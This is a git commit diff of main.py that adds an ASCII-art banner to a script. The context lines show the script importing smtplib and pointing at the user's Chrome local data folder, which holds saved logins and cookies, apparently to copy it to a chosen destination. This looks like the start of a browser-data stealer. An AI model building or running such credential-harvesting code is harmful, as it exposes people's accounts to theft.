5ef216a1d7c5a8b8a76ac6e0d730454e399cad02
CursedRicky <78096957+CursedRicky@users.noreply.github.com>
2024-01-17 16:50:24 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,13 @@
 import shutil, os, smtplib
 #from email.message import EmailMessage
 
+print(" _______                       .__                .__                                 ")
+print(" \      \ _____  ______   ____ |  |   ____   ____ |  |_________  ____   _____   ____  ")
+print(" /   |   \\__  \ \____ \ /  _ \|  | _/ __ \_/ ___\|  |  \_  __ \/  _ \ /     \_/ __ \ ")
+print("/    |    \/ __ \|  |_> >  <_> )  |_\  ___/\  \___|   Y  \  | \(  <_> )  Y Y  \  ___/ ")
+print("\____|__  (____  /   __/ \____/|____/\___  >\___  >___|  /__|   \____/|__|_|  /\___  >")
+print("        \/     \/|__|                    \/     \/     \/                   \/     \/ ")
+
 src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"
 dst = input("Percorso destinazione: ")
 
